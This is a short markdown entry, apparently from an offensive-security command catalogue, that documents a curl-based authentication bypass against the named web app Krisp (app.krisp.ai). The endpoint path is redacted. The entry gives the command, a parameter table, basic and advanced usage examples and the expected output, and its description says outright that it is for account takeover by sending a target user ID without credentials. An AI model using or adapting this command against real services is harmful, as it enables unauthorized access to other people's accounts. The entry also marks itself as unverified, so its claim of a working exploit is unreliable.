---
id: cmd-curl-auth-bypass-krisp-001
data: >-
  curl -X POST "<krisp-base-url>/api/███" -H "Content-Type: application/json" -d
  '{"user_id": "<target-user-id>"}' -c cookies.txt
tags:
  - web
  - exploit
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:42.974Z'
verified: false
validated: true
submitted: true
---
# curl-auth-bypass-krisp

## Command

```bash
curl -X POST "<krisp-base-url>/api/███" -H "Content-Type: application/json" -d '{"user_id": "<target-user-id>"}' -c cookies.txt
```

## Description

This command sends an unauthenticated POST request to the vulnerable critical function in the Krisp web application, bypassing authentication to establish a session for the specified user ID. Use it to initiate account takeover by exploiting missing auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `"<krisp-base-url>/api/███"` | The target endpoint URL (replace with actual base URL) | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"user_id": "<target-user-id>"}'` | JSON payload with target user ID (replace placeholder) | Yes |
| `-c cookies.txt` | Saves session cookies to file for subsequent requests | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://app.krisp.ai/api/███" -H "Content-Type: application/json" -d '{"user_id": "12345"}' -c cookies.txt
```

### Advanced Usage

```bash
curl -X POST "https://app.krisp.ai/api/███" -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"user_id": "12345", "action": "login"}' -c cookies.txt -v
```

## Expected Output

Successful execution returns HTTP 200 OK with a JSON response containing session details or confirmation. Cookies are saved to cookies.txt for use in follow-up requests. Failure (if patched) may return 401 Unauthorized.

## Related

- [[Related Procedure|procedures/Krisp-Auth-Bypass-for-Account-Takeover]]
- [[commands/curl-account-access-test]]
